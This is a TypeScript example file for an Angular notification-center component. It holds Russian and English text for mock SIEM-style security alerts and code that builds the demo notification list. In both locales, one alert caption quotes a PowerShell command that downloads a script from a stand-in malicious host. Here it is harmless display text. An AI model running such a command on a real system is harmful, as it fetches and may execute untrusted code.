import { computed, Signal, TemplateRef } from '@angular/core';
import { kbqInjectLocaleService } from '@koobiq/components/core';
import { KbqNotificationItem } from '@koobiq/components/notification-center';
import { KbqToastStyle } from '@koobiq/components/toast';

/** Resolves `data` for the active locale of the examples, falling back to `default` (English). */
export const injectLocalizedText = <T>(data: Record<string, T> & { default: T }): Signal<T> => {
    const localeService = kbqInjectLocaleService({ optional: true });

    return computed(() => data[localeService?.localeId() ?? 'default'] ?? data.default);
};

/** Text of one notification of the example list. */
interface ExampleNotificationText {
    title: string;
    caption?: string;
}

/** Text shown by the notification center examples. */
export interface ExampleText {
    appName: string;
    assets: string;
    issues: string;
    incidents: string;
    policies: string;
    security: string;
    notifications: string;
    systemMonitor: string;
    administrator: string;
    issueStatuses: { open: string; inProgress: string; complete: string; closed: string };
    securitySections: { identity: string; membersAndGuests: string; dataRetention: string };
    pageTitle: string;
    primaryAction: string;
    emptyState: { image: string; title: string; text: string };
    action1: string;
    action2: string;
    /** Caption of the notifications rendered through a template; it is followed by a link to the server. */
    richCaption: string;
    pushNotification: string;
    pushedTitle: string;
    pushedCaption: string;
    pageItemTitle: (index: number) => string;
    pageItemCaption: (page: number) => string;
    popoverAppName: string;
    projects: string;
    /** One entry per item of {@link NOTIFICATIONS}, in the same order. */
    list: ExampleNotificationText[];
}

const TEXT: Record<string, ExampleText> & { default: ExampleText } = {
    'ru-RU': {
        appName: 'Короткое название',
        assets: 'Активы',
        issues: 'Задачи',
        incidents: 'Инциденты',
        policies: 'Политики',
        security: 'Безопасность',
        notifications: 'Уведомления',
        systemMonitor: 'Мониторинг системы',
        administrator: 'Администратор',
        issueStatuses: { open: 'Открытые', inProgress: 'В работе', complete: 'Выполненные', closed: 'Закрытые' },
        securitySections: {
            identity: 'Идентификация',
            membersAndGuests: 'Участники и гости',
            dataRetention: 'Хранение данных'
        },
        pageTitle: 'Заголовок страницы',
        primaryAction: 'Основное действие',
        emptyState: { image: 'Пустое состояние', title: 'Нет объектов', text: 'Здесь пока нет добавленных объектов' },
        action1: 'Действие 1',
        action2: 'Действие 2',
        richCaption: 'Система обнаружения угроз заблокировала сложную APT-атаку на',
        pushNotification: 'Отправить уведомление',
        pushedTitle: 'Новое уведомление',
        pushedCaption: 'Подпись нового уведомления',
        pageItemTitle: (index) => `Уведомление № ${index}`,
        pageItemCaption: (page) => `Загружено на странице ${page}`,
        popoverAppName: 'Название приложения',
        projects: 'Проекты',
        list: [
            { title: 'Команда безопасности отразила крупную кибератаку' },
            {
                title: 'Подозрительный вход с адреса 192.168.1.45',
                caption: 'Пользователь admin пытался войти из необычного места'
            },
            { title: 'Высокая загрузка ЦП на Server-DB-01', caption: 'Процесс mysqld превысил 90% загрузки ЦП' },
            {
                title: 'Сработало новое правило: маячок вредоносного ПО',
                caption: 'Обнаружен подозрительный трафик к известному C2-серверу'
            },
            { title: 'Критично: попытка несанкционированного доступа к файлу' },
            { title: 'Создана учетная запись администратора', caption: 'Добавлена учетная запись sec-admin' },
            {
                title: 'Правило межсетевого экрана изменено',
                caption: 'Правило Allow RDP изменено пользователем ops-team'
            },
            { title: 'Превышен порог неудачных попыток входа', caption: 'Пользователь john.doe ошибся 15 раз' },
            { title: 'Сканирование уязвимостей завершено', caption: 'Доступен отчет: сканирование № 884' },
            {
                title: 'Атака методом перебора заблокирована',
                caption: 'IP-адрес 203.0.113.55 автоматически внесен в черный список'
            },
            { title: 'Применено обновление правил корреляции SIEM' },
            {
                title: 'Критично: обнаружены признаки программы-вымогателя',
                caption: 'Подозрительное шифрование на Server-FS-03'
            },
            { title: 'Резервное копирование успешно завершено', caption: 'Задание BKP-20251001-06' },
            { title: 'Запрос на сброс пароля', caption: 'Пользователь alex.smith запросил сброс пароля' },
            { title: 'Установлено обновление SIEM' },
            {
                title: 'Критично: обнаружено горизонтальное перемещение',
                caption: 'Подозрительное использование билета Kerberos учетной записью srv-ops'
            },
            { title: 'Диск заполнен более чем на 90%', caption: 'Раздел /var на Server-DB-02 почти заполнен' },
            {
                title: 'Подключено новое устройство: USB-накопитель',
                caption: 'Устройство USB-7782 на рабочей станции PC-004'
            },
            {
                title: 'Подозрительный исходящий трафик',
                caption: 'Соединение с доменом из черного списка bad-domain.com'
            },
            { title: 'Лицензия SIEM истекает через 30 дней' },
            {
                title: 'Пользователь добавлен в привилегированную группу',
                caption: 'mike.ross добавлен в группу Domain Admins'
            },
            { title: 'Запущена проверка соответствия политикам' },
            {
                title: 'Выполнена подозрительная команда PowerShell',
                caption: 'Команда: Invoke-WebRequest -Uri http://malicious.example/file.ps1'
            },
            { title: 'Обнаружена попытка фишинга по почте', caption: 'Отправитель: attacker@phishmail.com' },
            { title: 'Проверка работоспособности SIEM пройдена' },
            { title: 'Необычный объем передачи данных', caption: 'Рабочая станция PC-112 выгрузила 8 ГБ за 10 минут' },
            {
                title: 'Не установлено критическое обновление',
                caption: 'На Server-APP-09 нет обновления Microsoft KB500822'
            },
            {
                title: 'Учетная запись заблокирована из-за подозрительной активности',
                caption: 'Пользователь linda.j заблокирован после аномальных действий'
            },
            { title: 'Нехватка места на диске устранена', caption: 'Выполнена очистка на Server-BCK-02' },
            { title: 'Сформирован ежедневный отчет SIEM', caption: 'Доступен отчет: ежедневный № 20250927' }
        ]
    },
    default: {
        appName: 'Short App Name',
        assets: 'Assets',
        issues: 'Issues',
        incidents: 'Incidents',
        policies: 'Policies',
        security: 'Security',
        notifications: 'Notifications',
        systemMonitor: 'System Monitor',
        administrator: 'Administrator',
        issueStatuses: { open: 'Open', inProgress: 'In Progress', complete: 'Complete', closed: 'Closed' },
        securitySections: {
            identity: 'Identity',
            membersAndGuests: 'Members and guests',
            dataRetention: 'Data retention'
        },
        pageTitle: 'Page Title',
        primaryAction: 'Primary Action',
        emptyState: { image: 'Empty state', title: 'No items', text: 'No objects have been added here yet' },
        action1: 'Action 1',
        action2: 'Action 2',
        richCaption: 'Advanced threat detection system blocked sophisticated APT attack',
        pushNotification: 'push notification',
        pushedTitle: 'New notification',
        pushedCaption: 'New notification caption',
        pageItemTitle: (index) => `Notification #${index}`,
        pageItemCaption: (page) => `Loaded with page ${page}`,
        popoverAppName: 'App name',
        projects: 'Projects',
        list: [
            { title: 'Security team successfully prevented major cyber attack' },
            {
                title: 'Suspicious login detected from 192.168.1.45',
                caption: 'User admin attempted login from unusual location'
            },
            { title: 'High CPU usage on Server-DB-01', caption: 'Process mysqld exceeded 90% CPU' },
            {
                title: 'New rule triggered: Malware beaconing',
                caption: 'Detected suspicious traffic to known C2 server'
            },
            { title: 'Critical: Unauthorized file access attempt' },
            { title: 'New admin account created', caption: 'Account sec-admin was added' },
            { title: 'Firewall rule updated', caption: 'Rule Allow RDP modified by ops-team' },
            { title: 'Failed login attempts exceeded threshold', caption: 'User john.doe failed 15 times' },
            { title: 'Vulnerability scan completed', caption: 'Report available: Scan #884' },
            { title: 'Brute-force attack blocked', caption: 'IP 203.0.113.55 automatically blacklisted' },
            { title: 'SIEM correlation rule update applied' },
            { title: 'Critical: Ransomware pattern detected', caption: 'Suspicious encryption on Server-FS-03' },
            { title: 'Backup job completed successfully', caption: 'Job ID BKP-20251001-06' },
            { title: 'User password reset request', caption: 'User alex.smith requested password reset' },
            { title: 'SIEM system update installed' },
            { title: 'Critical: Lateral movement detected', caption: 'Suspicious Kerberos ticket use by srv-ops' },
            { title: 'Disk usage exceeded 90%', caption: 'Server-DB-02 partition /var almost full' },
            { title: 'New device connected: USB storage', caption: 'Device ID USB-7782 on workstation PC-004' },
            { title: 'Suspicious outbound traffic', caption: 'Connection to blacklisted domain bad-domain.com' },
            { title: 'SIEM license will expire in 30 days' },
            { title: 'User added to privileged group', caption: 'mike.ross added to Domain Admins' },
            { title: 'Policy compliance scan started' },
            {
                title: 'Suspicious PowerShell command executed',
                caption: 'Command: Invoke-WebRequest -Uri http://malicious.example/file.ps1'
            },
            { title: 'Email phishing attempt detected', caption: 'Sender: attacker@phishmail.com' },
            { title: 'SIEM system health check passed' },
            { title: 'Unusual data transfer volume', caption: 'Workstation PC-112 uploaded 8 GB in 10 min' },
            { title: 'Critical patch missing', caption: 'Server-APP-09 missing MS patch KB500822' },
            {
                title: 'Account locked due to suspicious activity',
                caption: 'User linda.j locked after abnormal behavior'
            },
            { title: 'Low disk space resolved', caption: 'Cleanup performed on Server-BCK-02' },
            { title: 'SIEM daily report generated', caption: 'Report available: Daily #20250927' }
        ]
    }
};

/** Text of the examples in the active locale. */
export const injectExampleText = (): Signal<ExampleText> => injectLocalizedText(TEXT);

/**
 * What the example notifications have in common across locales; their text comes from
 * {@link ExampleText.list} by position. `richCaption` items take the caption template instead.
 * `date` has no year: the notifications are dated in the current one.
 */
const NOTIFICATIONS: { date: string; style: KbqToastStyle; actions?: boolean; richCaption?: boolean }[] = [
    { date: '10-03T10:30:00Z', style: KbqToastStyle.Success, actions: true, richCaption: true },
    { date: '10-03T09:01:00Z', style: KbqToastStyle.Warning, actions: true },
    { date: '10-03T09:10:00Z', style: KbqToastStyle.Warning, actions: true },
    { date: '10-03T09:15:00Z', style: KbqToastStyle.Error },
    { date: '10-02T23:45:00Z', style: KbqToastStyle.Error, actions: true, richCaption: true },
    { date: '10-02T20:30:00Z', style: KbqToastStyle.Warning, actions: true },
    { date: '10-02T18:10:00Z', style: KbqToastStyle.Contrast },
    { date: '10-02T14:22:00Z', style: KbqToastStyle.Warning, actions: true },
    { date: '10-02T12:00:00Z', style: KbqToastStyle.Contrast },
    { date: '10-01T23:50:00Z', style: KbqToastStyle.Warning, actions: true },
    { date: '10-01T20:15:00Z', style: KbqToastStyle.Contrast },
    { date: '10-01T17:40:00Z', style: KbqToastStyle.Error, actions: true },
    { date: '10-01T06:15:00Z', style: KbqToastStyle.Success },
    { date: '09-30T23:59:00Z', style: KbqToastStyle.Contrast },
    { date: '09-30T21:20:00Z', style: KbqToastStyle.Success },
    { date: '09-30T19:05:00Z', style: KbqToastStyle.Error },
    { date: '09-30T13:45:00Z', style: KbqToastStyle.Warning },
    { date: '09-30T09:18:00Z', style: KbqToastStyle.Warning },
    { date: '09-29T23:15:00Z', style: KbqToastStyle.Error },
    { date: '09-29T21:10:00Z', style: KbqToastStyle.Warning, actions: true },
    { date: '09-29T18:40:00Z', style: KbqToastStyle.Warning, actions: true },
    { date: '09-29T15:00:00Z', style: KbqToastStyle.Contrast },
    { date: '09-29T09:45:00Z', style: KbqToastStyle.Error },
    { date: '09-29T07:20:00Z', style: KbqToastStyle.Error, actions: true },
    { date: '09-28T22:30:00Z', style: KbqToastStyle.Success },
    { date: '09-28T19:15:00Z', style: KbqToastStyle.Warning },
    { date: '09-28T14:00:00Z', style: KbqToastStyle.Error },
    { date: '09-28T08:55:00Z', style: KbqToastStyle.Warning, actions: true },
    { date: '09-27T21:40:00Z', style: KbqToastStyle.Success },
    { date: '09-27T08:00:00Z', style: KbqToastStyle.Contrast, actions: true }
];

/**
 * The example notification list in the language of `text`. The ids are stable, so a list rebuilt on a
 * locale switch keeps the read state it had in `current`.
 */
export const createNotifications = (
    text: ExampleText,
    templates: { actions: TemplateRef<unknown>; caption?: TemplateRef<unknown> },
    current: KbqNotificationItem[] = []
): KbqNotificationItem[] => {
    const read = new Map(current.map((item) => [item.id, item.read]));
    const year = new Date().getUTCFullYear();

    return NOTIFICATIONS.map(({ date, actions, richCaption, ...item }, index) => {
        const id = String(index + 1);
        const { title, caption } = text.list[index];

        return {
            ...item,
            id,
            date: `${year}-${date}`,
            title,
            caption: richCaption ? templates.caption : caption,
            icon: true,
            actions: actions ? templates.actions : undefined,
            read: read.get(id)
        };
    });
};
